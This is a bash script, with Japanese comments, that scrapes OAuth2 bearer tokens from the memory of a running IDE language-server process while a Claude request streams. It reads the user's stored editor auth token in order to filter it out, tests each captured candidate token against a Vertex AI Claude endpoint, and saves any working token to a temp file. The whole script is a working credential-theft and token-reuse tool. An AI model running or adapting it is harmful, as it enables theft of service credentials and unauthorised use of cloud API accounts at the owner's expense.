#!/bin/bash
# V16b-live: Streaming Memory Scan Orchestrator
#
# Claude の長文ストリーミング中に LS メモリをスキャンし、
# impersonated OAuth2 token (ya29.*) を抽出する。
#
# 使い方: bash scripts/v16b_live_capture.sh
#
set -uo pipefail

HGK_DIR="/home/makaron8426/oikos/hegemonikon"
SCANNER="$HGK_DIR/scripts/v16b_mem_scanner.py"
TOKEN_FILE="/tmp/v16b_tokens.txt"
RESULT="/tmp/v16b_result.txt"

echo "🔬 V16b-live: Streaming Memory Token Capture"
echo "============================================="

# Step 1: Find LS PID
LS_PID=$(pgrep -f 'language_server_linux.*server_port' | head -1)
if [ -z "$LS_PID" ]; then
  echo "❌ LS not running"
  exit 1
fi
echo "[1] LS PID: $LS_PID"

# Step 2: Get known user token (to filter out)
echo "[2] Extracting known user OAuth token..."
USER_TOKEN=$(python3 -c "
import sqlite3, json
db = sqlite3.connect('$HOME/.config/Antigravity/User/globalStorage/state.vscdb')
data = json.loads(db.execute(\"SELECT value FROM ItemTable WHERE key='antigravityAuthStatus'\").fetchone()[0])
print(data.get('apiKey', '')[:30])
" 2>/dev/null || echo "")
echo "  User token prefix: ${USER_TOKEN:0:20}..."

# Step 3: Baseline scan (before Claude call)
echo ""
echo "[3] Baseline scan (before Claude call)..."
python3 "$SCANNER" "$LS_PID" -o /tmp/v16b_baseline.txt 2>&1
BASELINE_COUNT=$(wc -l < /tmp/v16b_baseline.txt 2>/dev/null || echo "0")
echo "  Baseline tokens: $BASELINE_COUNT"

# Step 4: Start Claude call in background (long prompt for extended streaming)
echo ""
echo "[4] Starting Claude call (long prompt for extended streaming)..."
python3 "$HGK_DIR/mekhane/ochema/claude_cli.py" -m \
  "Please write a detailed step-by-step guide on how the Free Energy Principle explains perception. Include mathematical formulas and at least 5 numbered steps. Be thorough and detailed." \
  --raw --timeout 120 > /tmp/v16b_claude_output.txt 2>&1 &
CLAUDE_PID=$!
echo "  Claude call PID: $CLAUDE_PID"

# Step 5: Wait a moment for the request to reach Cortex, then scan
echo ""
echo "[5] Waiting 3s for Cortex connection..."
sleep 3

echo "[5b] Scanning memory during streaming (continuous, 20s)..."
python3 "$SCANNER" "$LS_PID" --continuous -o "$TOKEN_FILE" -k "$USER_TOKEN" 2>&1

# Step 6: Wait for Claude to finish
echo ""
echo "[6] Waiting for Claude call to complete..."
wait $CLAUDE_PID 2>/dev/null || true

# Step 7: Analysis
echo ""
echo "============================================="
echo "📊 V16b-live Results"
echo "============================================="
echo ""

TOTAL=$(wc -l < "$TOKEN_FILE" 2>/dev/null || echo "0")
echo "Total unique tokens found: $TOTAL"
echo "Baseline tokens: $BASELINE_COUNT"

if [ "$TOTAL" -gt 0 ]; then
  # Find NEW tokens (not in baseline)
  if [ -f /tmp/v16b_baseline.txt ] && [ -s /tmp/v16b_baseline.txt ]; then
    NEW_TOKENS=$(comm -23 <(sort "$TOKEN_FILE") <(sort /tmp/v16b_baseline.txt) | wc -l)
  else
    NEW_TOKENS=$TOTAL
  fi
  echo "NEW tokens (appeared during Claude call): $NEW_TOKENS"
  
  echo ""
  echo "=== All tokens (first 80 chars) ==="
  while IFS= read -r token; do
    echo "  ${token:0:80}..."
  done < "$TOKEN_FILE"
  
  # Try to identify which is the impersonated token
  echo ""
  echo "=== Token Classification ==="
  while IFS= read -r token; do
    if [ -n "$USER_TOKEN" ] && [[ "$token" == ${USER_TOKEN}* ]]; then
      echo "  [USER] ${token:0:60}..."
    else
      echo "  [CANDIDATE] ${token:0:60}..."
      # Save candidate to result
      echo "$token" >> "$RESULT"
    fi
  done < "$TOKEN_FILE"
  
  # Step 8: Test candidate tokens against Vertex AI
  if [ -f "$RESULT" ] && [ -s "$RESULT" ]; then
    echo ""
    echo "=== Testing candidate tokens against Vertex AI ==="
    while IFS= read -r candidate; do
      echo ""
      echo "Testing: ${candidate:0:40}..."
      # Try Vertex AI RawPredict with Claude model
      HTTP_CODE=$(curl -s -o /tmp/v16b_vertex_response.txt -w "%{http_code}" \
        -H "Authorization: Bearer $candidate" \
        -H "Content-Type: application/json" \
        "https://us-east5-aiplatform.googleapis.com/v1/projects/gen-lang-client-0759843349/locations/us-east5/publishers/anthropic/models/claude-sonnet-4-5@20250929:rawPredict" \
        -d '{
          "anthropic_version": "vertex-2023-10-16",
          "max_tokens": 100,
          "messages": [{"role": "user", "content": "Say hello"}]
        }' 2>/dev/null)
      
      echo "  HTTP Status: $HTTP_CODE"
      RESPONSE=$(cat /tmp/v16b_vertex_response.txt 2>/dev/null)
      echo "  Response: ${RESPONSE:0:200}"
      
      if [ "$HTTP_CODE" = "200" ]; then
        echo ""
        echo "🎉🎉🎉 SUCCESS! Direct Claude call via Vertex AI! 🎉🎉🎉"
        echo "Token: $candidate"
        echo "SAVED to: /tmp/v16b_working_token.txt"
        echo "$candidate" > /tmp/v16b_working_token.txt
        break
      fi
    done < "$RESULT"
  fi
fi

echo ""
echo "Claude output:"
head -3 /tmp/v16b_claude_output.txt 2>/dev/null
echo ""
echo "Files:"
echo "  Tokens: $TOKEN_FILE"
echo "  Candidates: $RESULT"
echo "  Claude output: /tmp/v16b_claude_output.txt"
